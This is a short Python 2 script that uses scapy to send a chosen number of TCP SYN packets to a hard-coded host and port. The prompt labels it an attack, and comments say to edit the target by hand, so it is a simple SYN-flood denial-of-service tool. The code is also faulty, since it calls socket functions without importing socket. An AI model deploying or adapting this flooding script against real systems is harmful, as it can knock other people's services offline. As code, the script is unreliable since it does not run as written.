import scapy.all as sc
import sys

def get_open_ports():
    '''

    :return: first open port number
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("", 0))
    s.listen(1)
    port = s.getsockname()[1]
    s.close()
    return port

def main():
    if sys.stdout != sys.__stdout__:
        sys.stdout = sys.__stdout__

    HOST = "localhost"  # manually update the host!
    PORT = 61585  # manually update the port!
    print 'Enter the number of SYN packets to send for attack:',
    num = None
    while not num:
        try:
            num = int(raw_input())
        except:
            print 'invalid number'
    sc.send(sc.IP(dst=HOST) / sc.TCP(sport=get_open_ports(),dport=PORT, flags='S') * num)

if __name__ == '__main__':
    main()
